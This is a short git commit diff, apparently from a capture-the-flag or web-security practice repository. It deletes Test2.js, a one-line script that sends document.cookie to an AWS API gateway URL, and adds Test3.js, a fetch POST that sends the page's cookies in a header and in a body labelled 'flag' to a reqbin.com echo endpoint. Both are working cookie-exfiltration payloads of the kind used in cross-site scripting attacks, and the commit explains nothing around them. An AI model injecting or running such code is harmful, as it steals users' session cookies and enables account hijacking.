1a162d725b222c709beab99b40503c9abf46551d
Soren-netka <75098777+Soren-netka@users.noreply.github.com>
2023-02-02 06:12:29 -0500

    4

--- Test2.js
+++
@@ -1,1 +0,0 @@
-fetch('https://1dczr9vl49.execute-api.us-east-2.amazonaws.com/gateway/?c='+document.cookie);
---
+++ Test3.js
@@ -0,0 +1,15 @@
+fetch("https://reqbin.com/echo/post/json", {
+method: 'POST',
+headers: {
+  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'Accept-Encoding': 'gzip, deflate',
+  'Content-Type': 'application/x-www-form-urlencoded',
+  'cookie': document.cookie
+},
+
+body: `{
+   "title": "flag",
+   "content": document.cookie,
+   "submit": "save"
+  }`,
+});
